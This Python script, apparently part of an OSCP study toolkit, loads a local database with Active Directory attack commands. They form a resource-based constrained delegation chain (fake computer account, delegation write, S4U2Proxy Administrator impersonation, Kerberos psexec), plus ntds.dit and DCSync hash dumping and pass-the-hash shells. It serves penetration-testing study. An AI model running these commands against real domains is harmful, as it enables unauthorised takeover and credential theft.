#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - RBCD PATCH            ##
##############################################
Adds RBCD and related AD attack commands:
  - SeMachineAccountPrivilege detection
  - impacket-addcomputer
  - impacket-rbcd
  - impacket-getST S4U2Proxy
  - impacket-secretsdump LOCAL (ntds.dit)
  - impacket-psexec Kerberos ticket
Usage:
    python3 rbcd_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "whoami",
        "description": "Check for SeMachineAccountPrivilege -- enables RBCD attack by allowing fake computer account creation",
        "command": "whoami /priv | findstr /i SeMachineAccountPrivilege",
        "category": "enumeration",
        "tags": "windows,ad,rbcd,SeMachineAccountPrivilege,privesc,enumeration"
    },
    {
        "tool": "impacket-addcomputer",
        "description": "Add fake computer account to domain -- required for RBCD. Needs SeMachineAccountPrivilege or default domain quota (10 computers per user)",
        "command": "impacket-addcomputer DOMAIN/USER -hashes ':NTHASH' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip DC_IP",
        "category": "ad-attacks",
        "tags": "windows,ad,rbcd,computer-account,impacket,SeMachineAccountPrivilege"
    },
    {
        "tool": "impacket-rbcd",
        "description": "Set msDS-AllowedToActOnBehalfOfOtherIdentity on target computer -- grants FAKE$ permission to impersonate users on TARGET$",
        "command": "impacket-rbcd DOMAIN/USER -hashes ':NTHASH' -action write -delegate-to 'TARGET$' -delegate-from 'FAKE$' -dc-ip DC_IP",
        "category": "ad-attacks",
        "tags": "windows,ad,rbcd,delegation,impacket,constrained-delegation"
    },
    {
        "tool": "impacket-rbcd",
        "description": "Read current RBCD delegation rights on a computer object",
        "command": "impacket-rbcd DOMAIN/USER -hashes ':NTHASH' -action read -delegate-to 'TARGET$' -dc-ip DC_IP",
        "category": "ad-attacks",
        "tags": "windows,ad,rbcd,delegation,impacket,enumeration"
    },
    {
        "tool": "impacket-getST",
        "description": "Request S4U2Proxy service ticket impersonating Administrator via RBCD -- generates ccache file for use with -k",
        "command": "impacket-getST DOMAIN/FAKE\\$:FakePass123! -spn cifs/TARGET.DOMAIN -impersonate Administrator -dc-ip DC_IP",
        "category": "ad-attacks",
        "tags": "windows,ad,rbcd,kerberos,s4u2proxy,silver-ticket,impacket"
    },
    {
        "tool": "impacket-getST",
        "description": "Export Kerberos ccache ticket for use with impacket tools",
        "command": "export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache",
        "category": "ad-attacks",
        "tags": "windows,ad,kerberos,ccache,ticket,impacket,rbcd"
    },
    {
        "tool": "impacket-psexec",
        "description": "PSExec using Kerberos ticket from ccache -- use after getST and export KRB5CCNAME",
        "command": "impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN",
        "category": "ad-attacks",
        "tags": "windows,ad,kerberos,psexec,rbcd,impacket,system"
    },
    {
        "tool": "impacket-secretsdump",
        "description": "Offline ntds.dit dump -- requires ntds.dit + SYSTEM + SECURITY hive files. Extracts all domain hashes without touching the DC",
        "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL",
        "category": "ad-attacks",
        "tags": "windows,ad,ntds,secretsdump,hash-dump,offline,impacket"
    },
    {
        "tool": "impacket-secretsdump",
        "description": "Remote secretsdump using NT hash -- DCSync equivalent via pass-the-hash",
        "command": "impacket-secretsdump DOMAIN/Administrator@DC_IP -hashes 'aad3b435b51404eeaad3b435b51404ee:NTHASH'",
        "category": "ad-attacks",
        "tags": "windows,ad,secretsdump,dcsync,pass-the-hash,impacket"
    },
    {
        "tool": "evil-winrm",
        "description": "WinRM access using NT hash -- pass the hash for interactive shell",
        "command": "evil-winrm -i TARGET_IP -u USERNAME -H 'NTHASH'",
        "category": "lateral-movement",
        "tags": "windows,winrm,pass-the-hash,evil-winrm,lateral-movement"
    },
    {
        "tool": "ntpdate",
        "description": "Sync time with DC -- required when Kerberos throws clock skew errors",
        "command": "sudo ntpdate DC_IP",
        "category": "ad-attacks",
        "tags": "windows,ad,kerberos,clock-skew,ntpdate,kerberos-error"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:55]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:55]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
